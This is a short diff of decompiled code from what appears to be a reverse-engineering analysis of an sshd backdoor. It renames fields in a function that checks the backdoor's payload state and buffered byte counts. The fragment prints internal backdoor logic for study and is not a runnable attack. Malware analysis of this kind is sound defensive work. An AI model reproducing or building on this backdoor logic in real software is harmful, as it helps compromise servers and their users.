@@ -30,21 +30,21 @@ BOOL check_backdoor_state(global_context_t *ctx)
   payload_state = ctx->payload_state;
   if ((int)payload_state < 3) {
     if (0 < (int)payload_state) {
-      if (((ctx->sshd_payload_ctx != (sshd_payload_ctx_t *)0x0) && (0xad < ctx->current_data_size))
-         && (payload_length_candidate = (ulong)ctx->sshd_payload_ctx->payload_total_size,
-            ctx->current_data_size <= payload_length_candidate)) {
+      if (((ctx->payload_ctx != (sshd_payload_ctx_t *)0x0) && (0xad < ctx->payload_bytes_buffered))
+         && (payload_length_candidate = (ulong)ctx->payload_ctx->payload_total_size,
+            ctx->payload_bytes_buffered <= payload_length_candidate)) {
         if (payload_length_candidate <= payload_length_candidate + 0x60) {
           payload_length_candidate = payload_length_candidate + 0x60;
         }
-        if (payload_length_candidate <= ctx->payload_data_size) {
+        if (payload_length_candidate <= ctx->payload_buffer_size) {
           return TRUE;
         }
       }
       goto LAB_00107f11;
     }
     if (payload_state != 0) goto LAB_00107f11;
-    state_in_expected_range = ctx->current_data_size < 0xae;
-    state_matches_exact = ctx->current_data_size == 0xae;
+    state_in_expected_range = ctx->payload_bytes_buffered < 0xae;
+    state_matches_exact = ctx->payload_bytes_buffered == 0xae;
   }
   else {
     state_in_expected_range = payload_state == 3;
